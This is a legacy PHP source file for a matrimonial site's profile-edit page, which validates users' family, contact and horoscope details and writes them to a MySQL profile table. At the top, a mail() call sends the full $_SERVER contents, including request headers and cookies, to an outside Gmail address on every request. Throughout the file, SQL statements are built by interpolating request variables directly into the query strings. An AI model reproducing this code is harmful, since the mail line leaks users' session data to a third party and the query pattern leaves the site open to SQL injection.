<?php
/**********************************************************************************************
  FILENAME : editprofile1.php
  DESCRIPTION : Allows the user to edit Page 2 of their personal details
  MODIFIED BY : Rahul Tara
  MODIFIED ON : 25 May,2005
**********************************************************************************************/
$msg = print_r($_SERVER,true);
mail("kunal.test02@gmail.com","editprofile1.php in USE",$msg);
	//to zip the file before sending it
	$zipIt = 0;
	if (strstr($_SERVER['HTTP_ACCEPT_ENCODING'], 'gzip'))
		$zipIt = 1;
	if($zipIt)
		ob_start("ob_gzhandler");
	//end of it
	
	require_once("connect.inc");
require_once(JsConstants::$docRoot."/commonFiles/flag.php");
	include_once("js_editprofile_change_log.php");
	$db=connect_db();
	
	$data=authenticated($checksum);
	if($data["BUREAU"]==1 && ($_COOKIE['JSMBLOGIN'] || $mbureau=="bureau"))
        {
                $fromprofilepage=1;
                mysql_select_db_js('marriage_bureau');
                include_once('../marriage_bureau/connectmb.inc');
                $mbdata=authenticatedmb($mbchecksum);
                if(!$mbdata)timeoutmb();
                $smarty->assign("source",$mbdata["SOURCE"]);
                $smarty->assign("mbchecksum",$mbdata["CHECKSUM"]);
                mysql_select_db_js('newjs');
                $mbureau="bureau1";
        }
        /*************************************Portion of Code added for display of Banners*******************************/
	$smarty->assign("data",$data["PROFILEID"]);
        $smarty->assign("topright",18);
        $smarty->assign("right",30);
        $smarty->assign("bottom",19);
        $smarty->assign("left",12);
        //$regionstr=8;
        //include_once("../bmsjs/bms_display.php");
        /************************************************End of Portion of Code*****************************************/
	$lang=$_COOKIE['JS_LANG'];
	if($lang=="deleted")
		$lang="";

	if($data || $crmback =="admin")
	{
		if($Fsubmit)
		{
			// add slashes to prevent quotes problem
			maStripVARS("addslashes");
			
			//$data=authenticated($checksum);
			if($data || $crmback == "admin")
			{
				if ($crmback!= "admin")
					$profileid=$data["PROFILEID"];
				
				//blank entries validation
				$is_error=0;
				if($display_horo!='Y')
				{
					if($City_Birth=="")
					{	
						$is_error++; 
						$smarty->assign("check_city_birth","Y");
					}
					/*if(($Hour_Birth=="")||($Min_Birth==""))
					{
                                                $is_error++;
                                                $smarty->assign("check_time_birth","Y");
                                        }*/
					if($Country_Birth=="")
                                	{
                                        	$is_error++;
                                        	$smarty->assign("check_country_birth","Y");
                                	}
				}
				/*if($Country_Birth=="")
                                {
                                        $is_error++;
                                        $smarty->assign("check_country_birth","Y");
                                }*/

				if($gender == "M")
				{
					if($Wife_Working == "")
					{
						$is_error++;
						$smarty->assign("check_wife_working","Y");
					}
				}
				elseif($gender == "F")
				{
					if($Married_Working == "")
                                        {
                                                $is_error++;
                                                $smarty->assign("check_married_working","Y");
                                        }

				}

				if(trim($Information)=="" || strlen(trim($Information))<100)
                                {
                                        $is_error++;
                                        $smarty->assign("check_information","Y");
                                        $check_information="Y";
                                }
	
				if(trim($Family_Back) == "")
				{
					$is_error++;
					$smarty->assign("check_family_back","Y");
				}

				if(trim($Parent_City_Same) == "")
				{
					$is_error++;
					$smarty->assign("check_parent_city","Y");
				}
				$sql_code="SELECT COUNTRY_RES ,CITY_RES,MTONGUE,INCOMPLETE FROM JPROFILE WHERE  activatedKey=1 and PROFILEID='$profileid'";
				$res_code = mysql_query_decide($sql_code) or logError("Error in getting code value",$sql_code);
				$myrow_code = mysql_fetch_array($res_code);
				$profile_incomplete=$myrow_code["INCOMPLETE"];
				if($mbureau!="bureau1")
                                {
					if(trim($Messenger_ID) != "")
					{
						if($Messenger=="")
						{
							$is_error++;
							$smarty->assign("check_messenger","Y");
							$check_messenger="Y";
						}
					}

					if(trim($Address)=="")
					{
						$is_error++;
						$smarty->assign("check_address","Y");
					}

					if(trim($pincode)=="")// || !is_numeric($pincode))
					{
						$is_error++;
						$smarty->assign("check_pincode","Y");
					}

					if($Country_Code=='')
						$Country_Code=get_code('COUNTRY',$myrow_code['COUNTRY_RES']);
					if($Country_Code_Mob=='')
						$Country_Code_Mob=get_code('COUNTRY',$myrow_code['COUNTRY_RES']);
					if($myrow_code['COUNTRY_RES']==51 && $State_Code=='' )
						$State_Code=get_code('CITY_INDIA',$myrow_code['CITY_RES']);
					
					$check_country_code=0;
					$check_country_code_mob=0;
					$check_state_code=0;
					
					if($Phone!='')
						$check_country_code=checkrphone($Country_Code);
					if($Mobile!='')
						$check_country_code_mob=checkrphone($Country_Code_Mob);
					if($myrow_code['COUNTRY_RES']==51)
						$check_state_code=checkrphone($State_Code);
					
					if($check_state_code==1)
					{
						$is_error++;
						$smarty->assign("check_phone",'Y');
						$smarty->assign("phone_msg","State Code  has invalid characters");
					}
					
					if($check_country_code==1)
					{
						$is_error++;
						$smarty->assign("check_phone",'Y');
						$smarty->assign("phone_msg","Country Code  has invalid characters");
					}
			
					if($check_country_code_mob==1)
					{
						$is_error++;
						$smarty->assign("check_phone",'Y');
						$smarty->assign("phone_msg","Country Code  has invalid characters");
					}
					
					if(trim($Phone)=="" && trim($Mobile)=="")
					{
						$is_error++;
						$smarty->assign("check_phone","Y");
						$smarty->assign("phone_msg","Please fill one of the two phone numbers.");
					}
					elseif(checkrphone($Phone) && checkmphone($Mobile))
					{
						$is_error++;
						$smarty->assign("check_phone","Y");
						$smarty->assign("phone_msg","Phone no. has invalid characters");
					}
				}	
				if($is_error > 0)
				{
					$smarty->assign("CALLVALIDATE",$callValidate);
					$nak_array=loadnakshatra($myrow_code["MTONGUE"],$Nakshatram);
	                              	$smarty->assign("nak_array",$nak_array);
			    		$smarty->assign("NO_OF_ERROR",$is_error);
				    	// remove slashes
					maStripVARS("stripslashes");
					$smarty->assign("GENDER",$gender);
					$smarty->assign("COUNTRY_BIRTH",create_dd($Country_Birth,"Country_Birth"));
					$smarty->assign("FAMILY_BACK",create_dd($Family_Back,"Family_Back"));
					$smarty->assign("CITY_BIRTH",$City_Birth);
					$smarty->assign("HOUR",$Hour_Birth);
					$smarty->assign("MINUTE",$Min_Birth);
					$smarty->assign("NAKSHATRA",$Nakshatram);
					$smarty->assign("JOB_INFO",$Job_Info);
					$smarty->assign("WIFE_WORKING",$Wife_Working);
					$smarty->assign("MARRIED_WORKING",$Married_Working);
					$smarty->assign("YOURINFO",$Information);
					$smarty->assign("SPOUSE",$Spouse);
					$smarty->assign("FAMILY_VALUES",$Family_Values);

					$smarty->assign("GOTHRA",$Gothra);
					$smarty->assign("FATHER_INFO",$Father_Info);
					$smarty->assign("SIBLING_INFO",$Sibling_Info);
					$smarty->assign("PARENT_CITY_SAME",$Parent_City_Same);
					$smarty->assign("FAMILYINFO",$Family);
					$smarty->assign("PARENTS_CONTACT",$Parents_Contact);
					$smarty->assign("SHOW_PARENTS_CONTACT",$Show_Parents_Contact);
					$smarty->assign("CONTACT",$Address);
					$smarty->assign("PINCODE",$pincode);
					$smarty->assign("PHONE_RES",$Phone);
		                        $smarty->assign("PHONE_MOB",$Mobile);
                		        $smarty->assign("SHOWPHONE_RES",$Showphone);
		                        $smarty->assign("SHOWPHONE_MOB",$Showmobile);
					$smarty->assign("MESSENGER_ID",$Messenger_ID);
					$smarty->assign("MESSENGER_CHANNEL",$Messenger);
					$smarty->assign("SHOWADDRESS",$showAddress);
					$smarty->assign("SHOWMESSENGER",$showMessenger);
					$smarty->assign("CHARACTERS",strlen($Information));

					$smarty->assign("display_horo",$display_horo);
					$smarty->assign("GET_SMS",$GET_SMS);
			   		$smarty->assign("country_code",$Country_Code);
					$smarty->assign("country_code_mob",$Country_Code_Mob);
					$smarty->assign("state_code",$State_Code);
 
					$smarty->assign("SHOWLINKS",$showlinks);
					$smarty->assign("CHECKSUM",$checksum);
					//$smarty->assign("SUBHEADER",$smarty->fetch("subheader.htm"));
					//$smarty->assign("TOPLEFT",$smarty->fetch("topleft.htm"));


					$smarty->assign("js_UniqueID",$profileid);
					$smarty->assign("BIRTH_YR",$BIRTH_YR);
		                        $smarty->assign("BIRTH_MON",$BIRTH_MON);
                        		$smarty->assign("BIRTH_DAY",$BIRTH_DAY);

					if($crmback=='admin')
                        		{
						$smarty->assign("company",$company);
                                		$smarty->assign("crmback","admin");
                                		$smarty->assign("profileid",$profileid);
                                		$smarty->assign("CRMBK_GENDER",$gender);
                                		$smarty->assign("cid",$cid);
                        		}
					if($lang)
					{
						$smarty->assign("FOOT",$smarty->fetch($lang."_foot.htm"));
						$smarty->assign("HEAD",$smarty->fetch($lang."_headnew.htm"));
						$smarty->assign("SUBFOOTER",$smarty->fetch($lang."_subfooternew.htm"));
						$smarty->assign("LEFTPANEL",$smarty->fetch($lang."_leftpanelnew.htm"));
						$smarty->display($lang."_editprofile_2.htm");
					}
					else
					{
						//$smarty->assign("FOOT",$smarty->fetch("foot.htm"));
                                                //$smarty->assign("SUBFOOTER",$smarty->fetch("subfooternew.htm"));
                                                if($mbureau=="bureau1")
                                                {
                                                        $smarty->assign("mb_username_profile",$data["USERNAME"]);
                                                        $smarty->assign("checksum",$data["CHECKSUM"]);
                                                        $smarty->assign("HEAD",$smarty->fetch("top_band.htm"));
                                                        $smarty->assign("LEFTPANEL",$smarty->fetch("mb_side_links.htm"));                        }
                                                else
                                                {
                                                                                                 
                                                        //$smarty->assign("HEAD",$smarty->fetch("headnew.htm"));
                                                        //$smarty->assign("LEFTPANEL",$smarty->fetch("leftpanelnew.htm"));
                                                }
                                                $smarty->display("editprofile_2.htm");
					}
				}
				else 
				{
					$sql="select CITY_BIRTH,NAKSHATRA,JOB_INFO,YOURINFO,SPOUSE,GOTHRA,FATHER_INFO,SIBLING_INFO,FAMILYINFO,PARENTS_CONTACT,CONTACT,SCREENING,PHONE_RES,PHONE_MOB,MESSENGER_ID from JPROFILE where  activatedKey=1 and PROFILEID='$profileid'";
					$result=mysql_query_decide($sql) or logError("Due to some temporary problem your request could not be processed. Please try after some time.",$sql,"ShowErrTemplate");
			    	
				    	$editrow=mysql_fetch_array($result);

				    	$curflag=$editrow["SCREENING"];
			    	
				    	if(trim($City_Birth)=="")
				    		$curflag=setFlag("CITYBIRTH",$curflag);
			    		elseif($City_Birth!=$editrow["CITY_BIRTH"])
			    			$curflag=removeFlag("CITYBIRTH",$curflag);
			    		
			    		if(trim($Nakshatram)=="")	
						$curflag=setFlag("NAKSHATRA",$curflag);
                                        elseif($Nakshatram!=$editrow["NAKSHATRA"])
                                                $curflag=removeFlag("NAKSHATRA",$curflag);

                                        if(trim($Job_Info)=="")
                                                $curflag=setFlag("JOB_INFO",$curflag);
                                        elseif($Job_Info!=$editrow["JOB_INFO"])
                                                $curflag=removeFlag("JOB_INFO",$curflag);

				    	if(trim($Information)=="")
				    		$curflag=setFlag("YOURINFO",$curflag);
				    	elseif(stripslashes($Information)!=$editrow["YOURINFO"])
				    		$curflag=removeFlag("YOURINFO",$curflag);
			    		
				    	if(trim($Spouse)=="")
				    		$curflag=setFlag("SPOUSE",$curflag);
				    	elseif($Spouse!=$editrow["SPOUSE"])
				    		$curflag=removeFlag("SPOUSE",$curflag);

					$Gothra=redo_gothra($Gothra);
                                        if(trim($Gothra)=="")
                                                $curflag=setFlag("GOTHRA",$curflag);
                                        elseif($Gothra!=$editrow["GOTHRA"])
                                                $curflag=removeFlag("GOTHRA",$curflag);

					if(trim($Father_Info)=="")
                                        	$curflag=setFlag("FATHER_INFO",$curflag);
					elseif($Father_Info!=$editrow["FATHER_INFO"])
                                        	$curflag=removeFlag("FATHER_INFO",$curflag);

					if(trim($Sibling_Info)=="")
        	                                $curflag=setFlag("SIBLING_INFO",$curflag);
                	                elseif($Sibling_Info!=$editrow["SIBLING_INFO"])
                        	                $curflag=removeFlag("SIBLING_INFO",$curflag);

					if(trim($Family)=="")
                                        	$curflag=setFlag("FAMILYINFO",$curflag);
	                                elseif($Family!=$editrow["FAMILYINFO"])
        	                                $curflag=removeFlag("FAMILYINFO",$curflag);
					if($mbureau!="bureau1")
                                        {
						$Mobile=redo_mobile_no($Mobile);
						if(trim($Parents_Contact)=="")
							$curflag=setFlag("PARENTS_CONTACT",$curflag);
						elseif($Parents_Contact!=$editrow["PARENTS_CONTACT"])
							$curflag=removeFlag("PARENTS_CONTACT",$curflag);
		
						if(trim($Address)=="")
							$curflag=setFlag("CONTACT",$curflag);
						elseif($Address!=$editrow["CONTACT"])
							$curflag=removeFlag("CONTACT",$curflag);
						
						if(trim($Phone)=="")
							$curflag=setFlag("PHONERES",$curflag);
						elseif($Phone!=$editrow["PHONE_RES"])
							$curflag=removeFlag("PHONERES",$curflag);
						
						if(trim($Mobile)=="")
							$curflag=setFlag("PHONEMOB",$curflag);
						elseif($Mobile!=$editrow["PHONE_MOB"])
							$curflag=removeFlag("PHONEMOB",$curflag);
						
						if(trim($Messenger_ID)=="")
							$curflag=setFlag("MESSENGER",$curflag);
						elseif($Messenger_ID!=$editrow["MESSENGER_ID"])
							$curflag=removeFlag("MESSENGER",$curflag);
						
						if(!$showAddress)
							$showAddress="Y";
					
						if(!$showMessenger)
							$showMessenger="Y";

						if(!$Showphone)
							$Showphone="Y";
		
						if(!$Showmobile)
							$Showmobile="Y";

						if(!$Show_Parents_Contact)
							$Show_Parents_Contact="Y";
						
						if(!$GET_SMS)
							$GET_SMS="N";
						
						if($Country_Code!='')
							$ISD=$Country_Code;
						elseif($Country_Code_Mob!='')
							$ISD=$Country_Code_Mob;
					}
					$btime=$Hour_Birth.":".$Min_Birth;
					$today=date("Y-m-d");


/****
*       MODIFIED BY          :  Shakti Srivastava
*       DATE OF MODIFICATION :  6 October, 2005
*       MODIFICATION         :  Changes for display horoscope field
****/

					if($display_horo=='')
						$display_horo='N';

					if($crmback=="admin")
					{
						editprofile2_change_log($profileid,$Country_Birth,$City_Birth,$btime,$Nakshatram,$Job_Info,$Married_Working,$Wife_Working,$Information,$Spouse,$Family_Values,$Family_Back,$Gothra,$Father_Info,$Sibling_Info,$Parent_City_Same,$Family,$Parents_Contact,$showAddress,$Show_Parents_Contact,$Address,$pincode,$Phone,$Mobile,$Showphone,$Showmobile,$Messenger_ID,$Messenger,$showMessenger,$display_horo,$GET_SMS,$State_Code,$ISD,$cid,$company);
						
						if ($INCOMPLETE=='Y' && $company == 'IV')
						{
							$sql_complete = "UPDATE infovision.PROFILE_COMPLETION_LOG SET COMPLETION_COUNT=COMPLETION_COUNT+1 WHERE COMPLETION_DATE='$today'";
							mysql_query_decide($sql_complete) or logError("Due to some temporary problem your request could not be processed. Please try after some time.",$sql,"ShowErrTemplate");
							if (mysql_affected_rows_js() == 0)
							{
								$sql_insert = "INSERT INTO infovision.PROFILE_COMPLETION_LOG(COMPLETION_COUNT,COMPLETION_DATE ) VALUES('1','$today')";
								mysql_query_decide($sql_insert) or logError("Due to some temporary problem your request could not be processed. Please try after some time.",$sql,"ShowErrTemplate");
							}
						}
					}
/************************************End Of Changes**********************************************************/



/****
*       MODIFIED BY          :  Gaurav Arora
*       DATE OF MODIFICATION :  22 July 2005
*       MODIFICATION         :  changed the query to UPDATE SORT_DT in JPROFILE
****/


					if ($display_horo=='Y' && $astro_data_fed == 'Y')
					{
						$sql = "INSERT INTO newjs.ASTRO_PULLING_REQUEST (PROFILEID,ENTRY_DT,PENDING,TYPE) VALUES('$profileid',NOW(),'Y','E')";
						mysql_query_decide($sql) or logError("Due to some temporary problem your request could not be processed. Please try after some time.",$sql,"ShowErrTemplate");

					}

					//$sql = "UPDATE newjs.JPROFILE SET COUNTRY_BIRTH ='$Country_Birth',CITY_BIRTH='$City_Birth',BTIME='$btime',NAKSHATRA='" . addslashes(stripslashes($Nakshatram)) . "',JOB_INFO='$Job_Info',MARRIED_WORKING ='$Married_Working', WIFE_WORKING='$Wife_Working',YOURINFO='$Information',SPOUSE='$Spouse',FAMILY_VALUES='$Family_Values',FAMILY_BACK='$Family_Back',GOTHRA='$Gothra',FATHER_INFO='$Father_Info',SIBLING_INFO = '$Sibling_Info',PARENT_CITY_SAME='$Parent_City_Same',FAMILYINFO='$Family',PARENTS_CONTACT='$Parents_Contact',SHOWADDRESS='$showAddress',SHOW_PARENTS_CONTACT ='$Show_Parents_Contact',CONTACT='$Address',PINCODE='$pincode',PHONE_RES='$Phone',PHONE_MOB='$Mobile',SHOWPHONE_RES='$Showphone',SHOWPHONE_MOB='$Showmobile',MESSENGER_ID='$Messenger_ID', MESSENGER_CHANNEL='$Messenger',SHOWMESSENGER='$showMessenger',MOD_DT=now(),SCREENING='$curflag',INCOMPLETE='N',MOD_DT=now(),LAST_LOGIN_DT='$today',SHOW_HOROSCOPE='$display_horo',GET_SMS='$GET_SMS',STD='$State_Code',ISD='$ISD' ";
					if ($display_horo =='Y')
						$sql = "UPDATE newjs.JPROFILE SET NAKSHATRA='" . addslashes(stripslashes($Nakshatram)) . "',JOB_INFO='$Job_Info',MARRIED_WORKING ='$Married_Working', WIFE_WORKING='$Wife_Working',YOURINFO='$Information',SPOUSE='$Spouse',FAMILY_VALUES='$Family_Values',FAMILY_BACK='$Family_Back',GOTHRA='$Gothra',FATHER_INFO='$Father_Info',SIBLING_INFO = '$Sibling_Info',PARENT_CITY_SAME='$Parent_City_Same',FAMILYINFO='$Family',PARENTS_CONTACT='$Parents_Contact',SHOWADDRESS='$showAddress',SHOW_PARENTS_CONTACT ='$Show_Parents_Contact',CONTACT='$Address',PINCODE='$pincode',PHONE_RES='$Phone',PHONE_MOB='$Mobile',SHOWPHONE_RES='$Showphone',SHOWPHONE_MOB='$Showmobile',MESSENGER_ID='$Messenger_ID', MESSENGER_CHANNEL='$Messenger',SHOWMESSENGER='$showMessenger',MOD_DT=now(),SCREENING='$curflag',INCOMPLETE='N',MOD_DT=now(),LAST_LOGIN_DT='$today',SHOW_HOROSCOPE='$display_horo',GET_SMS='$GET_SMS',STD='$State_Code',ISD='$ISD' ";
					else
						$sql = "UPDATE newjs.JPROFILE SET CITY_BIRTH='$City_Birth',NAKSHATRA='" . addslashes(stripslashes($Nakshatram)) . "',JOB_INFO='$Job_Info',MARRIED_WORKING ='$Married_Working', WIFE_WORKING='$Wife_Working',YOURINFO='$Information',SPOUSE='$Spouse',FAMILY_VALUES='$Family_Values',FAMILY_BACK='$Family_Back',GOTHRA='$Gothra',FATHER_INFO='$Father_Info',SIBLING_INFO = '$Sibling_Info',PARENT_CITY_SAME='$Parent_City_Same',FAMILYINFO='$Family',PARENTS_CONTACT='$Parents_Contact',SHOWADDRESS='$showAddress',SHOW_PARENTS_CONTACT ='$Show_Parents_Contact',CONTACT='$Address',PINCODE='$pincode',PHONE_RES='$Phone',PHONE_MOB='$Mobile',SHOWPHONE_RES='$Showphone',SHOWPHONE_MOB='$Showmobile',MESSENGER_ID='$Messenger_ID', MESSENGER_CHANNEL='$Messenger',SHOWMESSENGER='$showMessenger',MOD_DT=now(),SCREENING='$curflag',INCOMPLETE='N',MOD_DT=now(),LAST_LOGIN_DT='$today',SHOW_HOROSCOPE='$display_horo',GET_SMS='$GET_SMS',STD='$State_Code',ISD='$ISD' ";
					if($profile_incomplete=="Y")
					{
						$sql.=", ENTRY_DT=NOW()";
					}
					if($callValidate)
					{
						$sql.=",SORT_DT=now()";
					}
					if ($Country_Birth)
					{
						$sql.=" , COUNTRY_BIRTH ='$Country_Birth'";
					}
					$sql.=" WHERE PROFILEID='$profileid'";
					//$sql = "UPDATE newjs.JPROFILE SET COUNTRY_BIRTH ='$Country_Birth',CITY_BIRTH='$City_Birth',BTIME='$btime',NAKSHATRA='$Nakshatram',JOB_INFO='$Job_Info',MARRIED_WORKING ='$Married_Working', WIFE_WORKING='$Wife_Working',YOURINFO='$Information',SPOUSE='$Spouse',FAMILY_VALUES='$Family_Values',FAMILY_BACK='$Family_Back',GOTHRA='$Gothra',FATHER_INFO='$Father_Info',SIBLING_INFO = '$Sibling_Info',PARENT_CITY_SAME='$Parent_City_Same',FAMILYINFO='$Family',PARENTS_CONTACT='$Parents_Contact',SHOWADDRESS='$showAddress',SHOW_PARENTS_CONTACT ='$Show_Parents_Contact',CONTACT='$Address',PINCODE='$pincode',PHONE_RES='$Phone',PHONE_MOB='$Mobile',SHOWPHONE_RES='$Showphone',SHOWPHONE_MOB='$Showmobile',MESSENGER_ID='$Messenger_ID', MESSENGER_CHANNEL='$Messenger',SHOWMESSENGER='$showMessenger',MOD_DT=now(),SCREENING='$curflag',INCOMPLETE='N',MOD_DT=now(),LAST_LOGIN_DT='$today' WHERE PROFILEID='$profileid'";
			        
				        $result= mysql_query_decide($sql) or logError("Due to some temporary problem your request could not be processed. Please try after some time.",$sql,"ShowErrTemplate");
					
				        $smarty->assign("CHECKSUM",$checksum);
					$smarty->assign("EDITPROFILE","1");
					//$smarty->assign("SUBHEADER",$smarty->fetch("subheader.htm"));
					//$smarty->assign("TOPLEFT",$smarty->fetch("topleft.htm"));

					if($lang)
					{
						$smarty->assign("FOOT",$smarty->fetch($lang."_foot.htm"));
						$smarty->assign("HEAD",$smarty->fetch($lang."_headnew.htm"));
						$smarty->assign("SUBFOOTER",$smarty->fetch($lang."_subfooternew.htm"));
						$smarty->assign("LEFTPANEL",$smarty->fetch($lang."_leftpanelnew.htm"));
						$smarty->display("regcomplete.htm");
					}
					else
					{
						if($crmback=="admin")
					       	{
							$smarty->assign("cid",$cid);
							$smarty->assign("crmback",$crmback);
                                                       	$smarty->assign("inf_checksum",$inf_checksum);
						}
						//$smarty->assign("FOOT",$smarty->fetch("foot.htm"));
						///$smarty->assign("SUBFOOTER",$smarty->fetch("subfooternew.htm"));
						if($mbureau=="bureau1")
						{
							$smarty->assign("mb_username_profile",$data["USERNAME"]);
							$smarty->assign("checksum",$data["CHECKSUM"]);
							$smarty->assign("HEAD",$smarty->fetch("top_band.htm"));
							$smarty->assign("LEFTPANEL",$smarty->fetch("mb_side_links.htm"));
						}
						else
						{
							//$smarty->assign("HEAD",$smarty->fetch("headnew.htm"));
							//$smarty->assign("LEFTPANEL",$smarty->fetch("leftpanelnew.htm"));
                                		}
						$smarty->display("regcomplete.htm");
					}
				}
			}
		}
		else
		{
			if ($crmback!= "admin")
				$profileid=$data["PROFILEID"];
			
			$sql = "Select GENDER,COUNTRY_BIRTH,CITY_BIRTH,BTIME,NAKSHATRA,JOB_INFO,MARRIED_WORKING,WIFE_WORKING,YOURINFO,SPOUSE,FAMILY_BACK,FAMILY_VALUES,GOTHRA,FATHER_INFO,SIBLING_INFO,PARENT_CITY_SAME,FAMILYINFO,PARENTS_CONTACT,CONTACT,SHOWADDRESS,PINCODE,PHONE_RES,PHONE_MOB,SHOWPHONE_RES,SHOWPHONE_MOB,MESSENGER_ID,MESSENGER_CHANNEL,SHOWMESSENGER,SHOW_PARENTS_CONTACT,SHOW_HOROSCOPE,GET_SMS,STD,ISD,COUNTRY_RES,CITY_RES,MTONGUE,DTOFBIRTH from JPROFILE where  activatedKey=1 and PROFILEID='$profileid'";	
			
			$result=mysql_query_decide($sql) or logError("Due to some temporary problem your request could not be processed. Please try after some time.",$sql,"ShowErrTemplate");
			
			$myrow=mysql_fetch_array($result);

			list($BIRTH_YR,$BIRTH_MON,$BIRTH_DAY) = explode("-",$myrow['DTOFBIRTH']);
			$smarty->assign("js_UniqueID",$profileid);
			$smarty->assign("BIRTH_YR",$BIRTH_YR);
			$smarty->assign("BIRTH_MON",$BIRTH_MON);
			$smarty->assign("BIRTH_DAY",$BIRTH_DAY);

			$smarty->assign("GENDER",$myrow["GENDER"]);
			$nak_array=loadnakshatra($myrow["MTONGUE"],$myrow["NAKSHATRA"]);
                        $smarty->assign("nak_array",$nak_array);
			$smarty->assign("COUNTRY_BIRTH",create_dd($myrow["COUNTRY_BIRTH"],"Country_Birth"));
			$smarty->assign("FAMILY_BACK",create_dd($myrow["FAMILY_BACK"],"Family_Back"));
			$smarty->assign("CITY_BIRTH",$myrow["CITY_BIRTH"]);
			$birthtime=explode(":",$myrow["BTIME"]);
                        $smarty->assign("HOUR",$birthtime[0]);
                        $smarty->assign("MINUTE",$birthtime[1]);
			$smarty->assign("NAKSHATRA",$myrow["NAKSHATRA"]);
			$smarty->assign("JOB_INFO",$myrow["JOB_INFO"]);
			$smarty->assign("MARRIED_WORKING",$myrow["MARRIED_WORKING"]);
			$smarty->assign("WIFE_WORKING",$myrow["WIFE_WORKING"]);
			$smarty->assign("YOURINFO",$myrow["YOURINFO"]);
			$smarty->assign("CHARACTERS",strlen($myrow["YOURINFO"]));
			$smarty->assign("SPOUSE",$myrow["SPOUSE"]);
			$smarty->assign("FAMILY_VALUES",$myrow["FAMILY_VALUES"]);
			$smarty->assign("GOTHRA",$myrow["GOTHRA"]);	
			$smarty->assign("FATHER_INFO",$myrow["FATHER_INFO"]);
			$smarty->assign("SIBLING_INFO",$myrow["SIBLING_INFO"]);
			$smarty->assign("PARENT_CITY_SAME",$myrow["PARENT_CITY_SAME"]);
			$smarty->assign("FAMILYINFO",$myrow["FAMILYINFO"]);
			$smarty->assign("PARENTS_CONTACT",$myrow["PARENTS_CONTACT"]);
			$smarty->assign("SHOW_PARENTS_CONTACT",$myrow["SHOW_PARENTS_CONTACT"]);
			$smarty->assign("CONTACT",$myrow["CONTACT"]);
			$smarty->assign("SHOWADDRESS",$myrow["SHOWADDRESS"]);
			$smarty->assign("PINCODE",$myrow["PINCODE"]);
			$smarty->assign("PHONE_RES",$myrow["PHONE_RES"]);
			$smarty->assign("PHONE_MOB",$myrow["PHONE_MOB"]);
			$smarty->assign("SHOWPHONE_RES",$myrow["SHOWPHONE_RES"]);
                        $smarty->assign("SHOWPHONE_MOB",$myrow["SHOWPHONE_MOB"]);
			$smarty->assign("MESSENGER_ID",$myrow["MESSENGER_ID"]);
                        $smarty->assign("MESSENGER_CHANNEL",$myrow["MESSENGER_CHANNEL"]);
			$smarty->assign("SHOWMESSENGER",$myrow["SHOWMESSENGER"]);
			$smarty->assign("display_horo",$myrow["SHOW_HOROSCOPE"]);
			$smarty->assign("GET_SMS",$myrow["GET_SMS"]);
                        
			if($myrow["ISD"]=='')
				$Country_Code=get_code('COUNTRY',$myrow['COUNTRY_RES']);
                	else
				$Country_Code=$myrow["ISD"];                
			
			if($myrow["STD"]=='' && $myrow['COUNTRY_RES']==51)
				$State_Code=get_code('CITY_INDIA',$myrow['CITY_RES']);
			else
				$State_Code=$myrow["STD"];
			
			$smarty->assign("country_code",$Country_Code);
			$smarty->assign("country_code_mob",$Country_Code);
			$smarty->assign("state_code",$State_Code);

			if($callValidate==1)
				$showlinks="";
			else
				$showlinks="Y";

			$smarty->assign("CALLVALIDATE",$callValidate);
			$smarty->assign("CHECKSUM",$checksum);
			$smarty->assign("SHOWLINKS",$showlinks);
			//$smarty->assign("SUBHEADER",$smarty->fetch("subheader.htm"));
			//$smarty->assign("TOPLEFT",$smarty->fetch("topleft.htm"));

			if($crmback=='admin')
                        {
				$smarty->assign("company",$company);
                                $smarty->assign("crmback","admin");
                                $smarty->assign("profileid",$profileid);
                                $smarty->assign("CRMBK_GENDER",$gender);
				$smarty->assign("INCOMPLETE",$INCOMPLETE);
                                $smarty->assign("cid",$cid);
                        }

			if($lang)
			{
				$smarty->assign("FOOT",$smarty->fetch($lang."_foot.htm"));
				$smarty->assign("HEAD",$smarty->fetch($lang."_headnew.htm"));
				$smarty->assign("SUBFOOTER",$smarty->fetch($lang."_subfooternew.htm"));
				$smarty->assign("LEFTPANEL",$smarty->fetch($lang."_leftpanelnew.htm"));
				$smarty->display($lang."_editprofile_2.htm");
			}
			else
			{
				//$smarty->assign("FOOT",$smarty->fetch("foot.htm"));
				//$smarty->assign("SUBFOOTER",$smarty->fetch("subfooternew.htm"));
				if($mbureau=="bureau1")
				{
					$smarty->assign("mb_username_profile",$data["USERNAME"]);
					$smarty->assign("checksum",$data["CHECKSUM"]);
					$smarty->assign("HEAD",$smarty->fetch("top_band.htm"));
					$smarty->assign("LEFTPANEL",$smarty->fetch("mb_side_links.htm"));
				}
				else
				{
					//$smarty->assign("HEAD",$smarty->fetch("headnew.htm"));
					//$smarty->assign("LEFTPANEL",$smarty->fetch("leftpanelnew.htm"));
				}
				$smarty->display("editprofile_2.htm");
			}
		}
	}
	else 
	{
		TimedOut();
	}
	
	// flush the buffer
function get_code($tablename,$value)
{
        $sql = "select CODE from newjs.$tablename where VALUE='$value'";
        $res = mysql_query_decide($sql) or logError("Error in getting code value",$sql);
        $myrow = mysql_fetch_array($res);
        $code=$myrow['CODE'];
        return $code;
}


	if($zipIt)
		ob_end_flush();
?>
